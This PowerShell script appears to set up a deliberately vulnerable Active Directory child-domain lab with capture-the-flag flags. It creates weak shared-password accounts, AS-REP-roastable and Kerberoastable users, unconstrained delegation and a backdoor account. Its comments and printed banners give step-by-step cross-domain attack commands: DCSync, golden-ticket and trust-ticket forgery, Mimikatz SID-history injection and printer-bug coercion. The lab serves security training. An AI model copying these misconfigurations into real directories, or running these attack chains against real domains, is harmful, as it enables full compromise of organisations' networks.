#Requires -RunAsAdministrator
#Requires -Modules ActiveDirectory

<#
.SYNOPSIS
    AD Lab - dev.corp.local Child Domain Setup

.DESCRIPTION
    Run this on DC-02 AFTER promoting it as a child domain controller.
    dev.corp.local is a child domain of corp.local.
    Attack coverage:
      - Cross-domain Kerberoasting and AS-REP Roasting
      - Unconstrained Delegation in child domain (coerce parent DC)
      - Child-to-Parent escalation via ExtraSids (Golden Ticket)
      - Trust Ticket attack (inter-realm TGT forgery)
      - SID History abuse
      - Foreign Security Principal membership

.ENVIRONMENT
    DC-02      : dev.corp.local (this machine)
    DC-01      : corp.local     (parent DC)
    Trust      : Automatic child domain trust (bidirectional, transitive)

.HOW TO RUN
    On DC-02 as Administrator, AFTER child domain promotion:
        Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
        .\Setup-DevCorpLocal.ps1

.PROMOTING DC-02 AS CHILD DOMAIN
    On DC-02 (clean Windows Server), run:
        Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools
        Install-ADDSDomain `
            -NewDomainName "dev" `
            -ParentDomainName "corp.local" `
            -NewDomainNetbiosName "DEV" `
            -DomainMode WinThreshold `
            -InstallDns `
            -SafeModeAdministratorPassword (ConvertTo-SecureString "p@ssw0rd" -AsPlainText -Force) `
            -Credential (Get-Credential corp\Administrator) `
            -Force

.WARNING
    INTERNAL LAB ONLY. Intentional misconfigurations present.
#>

Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

#region SECTION 0 - Global Configuration
$ChildDomain   = "dev.corp.local"
$ChildDomainDN = "DC=dev,DC=corp,DC=local"
$ParentDomain  = "corp.local"
$DCHostname    = $env:COMPUTERNAME
$LabPassword   = ConvertTo-SecureString "p@ssw0rd" -AsPlainText -Force

Write-Host "`n[*] AD Lab Setup - dev.corp.local - DC: $DCHostname" -ForegroundColor Cyan
Write-Host "[*] Child Domain DN : $ChildDomainDN`n" -ForegroundColor Cyan
#endregion

#region SECTION 1 - Verify Trust with Parent Domain
Write-Host "`n[SECTION 1] Verifying trust with corp.local" -ForegroundColor Magenta

$trust = Get-ADTrust -Filter "Name -eq '$ParentDomain'" -ErrorAction SilentlyContinue
if ($trust) {
    Write-Host "  [+] Trust found: $($trust.Name) - Direction: $($trust.Direction)" -ForegroundColor Green
} else {
    Write-Warning "  [!] Trust with corp.local NOT found. Make sure the child domain promotion completed."
    Write-Host "      Continuing anyway - some cross-domain steps may fail." -ForegroundColor Yellow
}
#endregion

#region SECTION 2 - Helper Functions (same as CorpLocal)
function New-OUSafe {
    param([string]$Name, [string]$Path)
    $dn = "OU=$Name,$Path"
    if (-not (Get-ADOrganizationalUnit -Filter "DistinguishedName -eq '$dn'" -ErrorAction SilentlyContinue)) {
        New-ADOrganizationalUnit -Name $Name -Path $Path -ProtectedFromAccidentalDeletion $false
        Write-Host "  [+] OU : $dn" -ForegroundColor Green
    } else {
        Write-Host "  [~] OU exists : $dn" -ForegroundColor Yellow
    }
    return $dn
}

function New-ADUserSafe {
    param([hashtable]$P)
    $sam = $P["SamAccountName"]
    if (-not (Get-ADUser -Filter "SamAccountName -eq '$sam'" -ErrorAction SilentlyContinue)) {
        New-ADUser @P
        Write-Host "  [+] User : $sam" -ForegroundColor Green
    } else {
        Write-Host "  [~] User exists : $sam" -ForegroundColor Yellow
    }
}

function New-ADGroupSafe {
    param([string]$Name, [string]$Path, [string]$Desc = "")
    if (-not (Get-ADGroup -Filter "Name -eq '$Name'" -ErrorAction SilentlyContinue)) {
        New-ADGroup -Name $Name -GroupScope Global -GroupCategory Security -Path $Path -Description $Desc
        Write-Host "  [+] Group : $Name" -ForegroundColor Green
    } else {
        Write-Host "  [~] Group exists : $Name" -ForegroundColor Yellow
    }
}

function Add-MemberSafe {
    param([string]$Group, [string]$Member)
    try {
        Add-ADGroupMember -Identity $Group -Members $Member -ErrorAction Stop
        Write-Host "  [+] $Member -> $Group" -ForegroundColor Green
    } catch {
        if ($_.Exception.Message -like "*already a member*") {
            Write-Host "  [~] $Member already in $Group" -ForegroundColor Yellow
        } else {
            Write-Host "  [!] $Member -> $Group : $_" -ForegroundColor Red
        }
    }
}
#endregion

#region SECTION 3 - OUs
Write-Host "`n[SECTION 3] Creating OUs" -ForegroundColor Magenta

$OU_DevIT   = New-OUSafe "DevIT"       $ChildDomainDN
$OU_DevOps  = New-OUSafe "DevOps"      $ChildDomainDN
$OU_DevDev  = New-OUSafe "DevDev"      $ChildDomainDN
$OU_DevSVC  = New-OUSafe "DevService"  $ChildDomainDN
$OU_DevDis  = New-OUSafe "DevDisabled" $ChildDomainDN
$OU_DevSRV  = New-OUSafe "DevServers"  $ChildDomainDN
#endregion

#region SECTION 4 - Groups
Write-Host "`n[SECTION 4] Creating Groups" -ForegroundColor Magenta

New-ADGroupSafe "Dev Admins"   $OU_DevIT  "Admins of dev.corp.local"
New-ADGroupSafe "DevOps Team"  $OU_DevOps "DevOps engineers"
New-ADGroupSafe "Dev Helpdesk" $OU_DevIT  "Dev domain helpdesk"
#endregion

#region SECTION 5 - Users
Write-Host "`n[SECTION 5] Creating Users" -ForegroundColor Magenta

# Dev domain admin
New-ADUserSafe @{
    SamAccountName    = "faris.admin"
    Name              = "Faris Admin"
    GivenName         = "Faris"; Surname = "Admin"
    UserPrincipalName = "faris.admin@$ChildDomain"
    Path              = $OU_DevIT
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    Description       = "Dev Domain Admin - also has access to corp.local resources"
}

New-ADUserSafe @{
    SamAccountName    = "sultan.ops"
    Name              = "Sultan Ops"
    GivenName         = "Sultan"; Surname = "Ops"
    UserPrincipalName = "sultan.ops@$ChildDomain"
    Path              = $OU_DevOps
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "DevOps engineer - deploys to corp.local servers"
}

New-ADUserSafe @{
    SamAccountName    = "bader.dev"
    Name              = "Bader Dev"
    GivenName         = "Bader"; Surname = "Dev"
    UserPrincipalName = "bader.dev@$ChildDomain"
    Path              = $OU_DevDev
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $false
    Description       = "Developer - flag{child_domain_user_enum}"
}

# AS-REP Roastable in child domain
New-ADUserSafe @{
    SamAccountName    = "majed.asrep"
    Name              = "Majed ASREP"
    GivenName         = "Majed"; Surname = "ASREP"
    UserPrincipalName = "majed.asrep@$ChildDomain"
    Path              = $OU_DevDev
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    Description       = "Developer - pre-auth disabled by mistake - flag{asrep_child_majed}"
}

# Kerberoastable service account in child domain
New-ADUserSafe @{
    SamAccountName    = "svc_dev_sql"
    Name              = "svc_dev_sql"
    UserPrincipalName = "svc_dev_sql@$ChildDomain"
    Path              = $OU_DevSVC
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    Description       = "Dev SQL service - flag{kerberoast_child_sql}"
}

# Backdoor account for SID History demo
New-ADUserSafe @{
    SamAccountName    = "dev.backdoor"
    Name              = "Dev Backdoor"
    UserPrincipalName = "dev.backdoor@$ChildDomain"
    Path              = $OU_DevDis
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    Description       = "Created by attacker after child domain compromise - SID History abuse demo"
}

# Trainee in child domain
New-ADUserSafe @{
    SamAccountName    = "attacker.dev"
    Name              = "Attacker Dev"
    UserPrincipalName = "attacker.dev@$ChildDomain"
    Path              = $ChildDomainDN
    AccountPassword   = $LabPassword
    Enabled           = $true
    PasswordNeverExpires = $true
    Description       = "Lab trainee - child domain starting point"
}
#endregion

#region SECTION 6 - AS-REP Roasting in child domain
# ATTACK: impacket GetNPUsers.py dev.corp.local/ -usersfile users.txt -dc-ip <DC-02-IP>
Write-Host "`n[SECTION 6] AS-REP Roastable (child domain)" -ForegroundColor Magenta
try {
    Set-ADAccountControl -Identity "majed.asrep" -DoesNotRequirePreAuth $true
    Write-Host "  [+] AS-REP: majed.asrep" -ForegroundColor Green
} catch {
    Write-Host "  [!] AS-REP majed.asrep: $_" -ForegroundColor Red
}
#endregion

#region SECTION 7 - Kerberoastable Service Account in Child Domain
# ATTACK: impacket GetUserSPNs.py dev.corp.local/attacker.dev:p@ssw0rd -dc-ip <DC-02-IP>
#         Cross-domain: GetUserSPNs.py corp.local/attacker.01:p@ssw0rd -dc-ip <DC-01-IP> -target-domain dev.corp.local
Write-Host "`n[SECTION 7] SPN for child domain Kerberoasting" -ForegroundColor Magenta
$existing = & setspn -L svc_dev_sql 2>&1
if ($existing -notmatch "DEV-SQL-01") {
    & setspn -S "MSSQLSvc/DEV-SQL-01.$ChildDomain`:1433" svc_dev_sql | Out-Null
    Write-Host "  [+] SPN: MSSQLSvc/DEV-SQL-01.$ChildDomain:1433 -> svc_dev_sql" -ForegroundColor Green
} else {
    Write-Host "  [~] SPN exists for svc_dev_sql" -ForegroundColor Yellow
}
#endregion

#region SECTION 8 - Computer Objects
Write-Host "`n[SECTION 8] Creating Computer Objects" -ForegroundColor Magenta

if (-not (Get-ADComputer -Filter "Name -eq 'DEV-WEB-01'" -ErrorAction SilentlyContinue)) {
    New-ADComputer -Name "DEV-WEB-01" -Path $OU_DevSRV -Description "Dev web server - unconstrained delegation"
    Write-Host "  [+] Computer: DEV-WEB-01" -ForegroundColor Green
} else {
    Write-Host "  [~] Computer exists: DEV-WEB-01" -ForegroundColor Yellow
}
#endregion

#region SECTION 9 - Unconstrained Delegation in Child Domain
# -----------------------------------------------------------------
# ATTACK (cross-domain delegation chain):
#   1. Compromise DEV-WEB-01 in child domain
#   2. Run Rubeus monitor on DEV-WEB-01
#   3. Coerce DC-01 (corp.local DC) to authenticate to DEV-WEB-01
#      using PrinterBug or PetitPotam:
#      SpoolSample.exe DC-01.corp.local DEV-WEB-01.dev.corp.local
#   4. Capture DC-01$ TGT (cross-domain)
#   5. DCSync corp.local -> dump krbtgt hash -> Golden Ticket
# -----------------------------------------------------------------
Write-Host "`n[SECTION 9] Unconstrained Delegation on DEV-WEB-01" -ForegroundColor Magenta
try {
    Set-ADComputer -Identity "DEV-WEB-01" -TrustedForDelegation $true
    Write-Host "  [+] Unconstrained Delegation: DEV-WEB-01" -ForegroundColor Green
    Write-Host "  [!] Cross-domain attack: coerce DC-01.corp.local to authenticate to DEV-WEB-01" -ForegroundColor Yellow
} catch {
    Write-Host "  [!] Unconstrained delegation: $_" -ForegroundColor Red
}
#endregion

#region SECTION 10 - Group Memberships
Write-Host "`n[SECTION 10] Group memberships" -ForegroundColor Magenta

Add-MemberSafe "Dev Admins"   "faris.admin"
Add-MemberSafe "DevOps Team"  "sultan.ops"
Add-MemberSafe "DevOps Team"  "bader.dev"
Add-MemberSafe "Dev Helpdesk" "sultan.ops"
#endregion

#region SECTION 11 - Foreign Security Principal (Cross-Domain Group Membership)
# -----------------------------------------------------------------
# Add a corp.local user (svc_backup) to a child domain group.
# This demonstrates that after compromising svc_backup in corp.local:
#   - svc_backup has DCSync rights in corp.local  (CRTP privilege escalation)
#   - svc_backup is also in Dev Admins in dev.corp.local  (cross-domain access)
# Tool: BloodHound will show this as a cross-domain edge
# -----------------------------------------------------------------
Write-Host "`n[SECTION 11] Adding corp.local FSP to child domain group" -ForegroundColor Magenta
try {
    $parentSvcBackup = Get-ADUser -Identity "svc_backup" -Server $ParentDomain -ErrorAction Stop
    Add-ADGroupMember -Identity "Dev Admins" -Members $parentSvcBackup
    Write-Host "  [+] corp\svc_backup added to Dev Admins (Foreign Security Principal)" -ForegroundColor Green
    Write-Host "  [!] BloodHound cross-domain edge: svc_backup -> Dev Admins (dev.corp.local)" -ForegroundColor Yellow
} catch {
    Write-Host "  [~] FSP: corp\svc_backup not reachable (ensure corp.local trust is active): $_" -ForegroundColor Yellow
}
#endregion

#region SECTION 12 - Cross-Domain Attack Path Documentation
# =============================================================================
Write-Host "`n=================================================================" -ForegroundColor Cyan
Write-Host "       CROSS-DOMAIN ATTACK PATHS (CRTE Level)                   " -ForegroundColor Cyan
Write-Host "=================================================================" -ForegroundColor Cyan

Write-Host @"

  TOPOLOGY:
    corp.local (DC-01) <--[Child Trust]--> dev.corp.local (DC-02)

  [A] Child-to-Parent Escalation via ExtraSids (Golden Ticket)
  ----------------------------------------------------------------
  Prerequisite: DA in dev.corp.local (e.g. compromise faris.admin)

  Step 1 - DCSync child domain krbtgt:
    impacket secretsdump.py DEV/faris.admin:p@ssw0rd@DC-02 -just-dc-user krbtgt

  Step 2 - Get SIDs:
    Child domain SID : Get-ADDomain dev.corp.local | Select DomainSID
    Parent EA SID    : (Get-ADGroup -Server corp.local "Enterprise Admins").SID

  Step 3 - Forge Golden Ticket with ExtraSids pointing to corp.local EA:
    Rubeus golden /user:Administrator /domain:dev.corp.local
                  /sid:<CHILD-SID> /krbtgt:<CHILD-KRBTGT-NTLM>
                  /sids:<PARENT-EA-SID> /ptt
    OR
    impacket ticketer.py -nthash <krbtgt-hash> -domain-sid <child-sid>
                         -domain dev.corp.local -extra-sid <parent-EA-SID>
                         Administrator

  Step 4 - Access corp.local as Enterprise Admin:
    impacket psexec.py -k -no-pass DC-01.corp.local

  [B] Trust Ticket Attack (Inter-Realm TGT Forgery)
  ----------------------------------------------------------------
  Prerequisite: Get the trust key from the TDO (Trusted Domain Object)

  Step 1 - DCSync to get trust key (stored as corp.local$ account in child):
    impacket secretsdump.py DEV/faris.admin:p@ssw0rd@DC-02 -just-dc-user corp.local$

  Step 2 - Forge inter-realm referral TGT:
    impacket ticketer.py -nthash <trust-key> -domain-sid <child-sid>
                         -domain dev.corp.local -spn krbtgt/corp.local Administrator

  Step 3 - Use referral TGT to request TGS for corp.local service:
    impacket getST.py -k -no-pass -spn CIFS/DC-01.corp.local dev.corp.local/Administrator

  [C] SID History Abuse
  ----------------------------------------------------------------
  After child DA:
    Mimikatz: privilege::debug
              misc::addsid dev.backdoor S-1-5-21-<PARENT-DOMAIN>-519
  This adds Enterprise Admins SID to dev.backdoor SIDHistory.
  dev.backdoor now has EA rights in corp.local.

  Detect: Get-ADUser dev.backdoor -Properties SIDHistory

  [D] Cross-Domain Kerberoasting
  ----------------------------------------------------------------
  From corp.local user, target child domain SPNs:
    impacket GetUserSPNs.py corp.local/attacker.01:p@ssw0rd -dc-ip DC-01-IP -target-domain dev.corp.local
  Target: svc_dev_sql (MSSQLSvc/DEV-SQL-01.dev.corp.local:1433)

  [E] Cross-Domain Unconstrained Delegation Coercion
  ----------------------------------------------------------------
  DEV-WEB-01 has unconstrained delegation.
  Coerce DC-01.corp.local to authenticate to DEV-WEB-01:
    SpoolSample.exe DC-01.corp.local DEV-WEB-01.dev.corp.local
  Capture corp.local DC$ TGT on DEV-WEB-01.
  Pass-the-ticket -> DCSync corp.local.

"@ -ForegroundColor White

#endregion

#region SECTION 13 - Summary
Write-Host "=================================================================" -ForegroundColor Cyan
Write-Host "       dev.corp.local SETUP COMPLETE                            " -ForegroundColor Cyan
Write-Host "=================================================================" -ForegroundColor Cyan

Write-Host "`n[CREDENTIALS] All dev.corp.local accounts use: p@ssw0rd`n" -ForegroundColor White
$devCreds = @(
    [pscustomobject]@{User="faris.admin";  Domain="dev.corp.local"; Role="Dev Domain Admin"},
    [pscustomobject]@{User="sultan.ops";   Domain="dev.corp.local"; Role="DevOps"},
    [pscustomobject]@{User="bader.dev";    Domain="dev.corp.local"; Role="Developer"},
    [pscustomobject]@{User="majed.asrep";  Domain="dev.corp.local"; Role="Developer [AS-REP Roastable]"},
    [pscustomobject]@{User="svc_dev_sql";  Domain="dev.corp.local"; Role="Service [Kerberoastable]"},
    [pscustomobject]@{User="dev.backdoor"; Domain="dev.corp.local"; Role="SID History demo"},
    [pscustomobject]@{User="attacker.dev"; Domain="dev.corp.local"; Role="Trainee (low priv)"}
)
$devCreds | Format-Table -AutoSize

Write-Host "[COMPUTERS]" -ForegroundColor Yellow
Write-Host "  DEV-WEB-01  : Unconstrained Delegation enabled"

Write-Host "`n[CROSS-DOMAIN PATHS]" -ForegroundColor Yellow
Write-Host "  Child DA -> ExtraSids Golden Ticket -> Enterprise Admin in corp.local"
Write-Host "  Trust Ticket -> inter-realm TGT forgery -> corp.local access"
Write-Host "  SID History -> dev.backdoor with EA SID -> corp.local EA rights"
Write-Host "  Cross-domain Kerberoast -> svc_dev_sql from corp.local attacker account"

Write-Host "`n=================================================================" -ForegroundColor Cyan
Write-Host " Next: Run BloodHound to visualize all attack paths in both domains" -ForegroundColor Yellow
Write-Host "=================================================================`n" -ForegroundColor Cyan
#endregion
